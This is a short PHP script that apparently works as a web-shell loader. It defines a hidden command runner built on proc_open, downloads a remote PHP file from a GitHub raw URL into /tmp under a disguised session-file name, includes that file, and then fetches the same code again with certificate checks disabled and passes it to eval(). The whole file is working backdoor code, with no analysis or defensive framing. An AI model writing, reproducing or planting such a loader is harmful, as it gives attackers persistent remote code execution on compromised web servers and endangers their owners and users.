<?php function ex($coman, $serlok)
{
    $ler = "2>&1";
    if (!preg_match("/" . $ler . "/i", $coman)) {
        $coman = $coman . " " . $ler;
    }
    $pr = "proc_open";
    if (function_exists($pr)) {
        $tod = @$pr(
            $coman,
            [0 => ["pipe", "r"], 1 => ["pipe", "w"], 2 => ["pipe", "r"]],
            $crottz,
            $serlok
        );
        echo htmlspecialchars(stream_get_contents($crottz[1]));
    } else {
        return false;
    }
}

$fname = "sess_" . md5("rex") . ".php";
if (!file_exists("/tmp/$fname") || filesize("/tmp/$fname") < 10) {
    ex(
        "curl --output /tmp/$fname https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/miniku.php",
        "/tmp"
    );
}

include "/tmp/$fname";

$protocol = "https";
$domain = "raw.githubusercontent.com/tikung6etar/";
$file_path = "Nyarek/refs/heads/master/miniku.php";
$url = $protocol . "://" . $domain . $file_path;
function fetch_with_curl($url)
{
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // optional: skip SSL verification
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // optional: skip hostname verification
    $data = curl_exec($ch);
    curl_close($ch);
    return $data;
}
$content = fetch_with_curl($url);
if ($content !== false) {
    eval("?>" . $content);
}
?> 
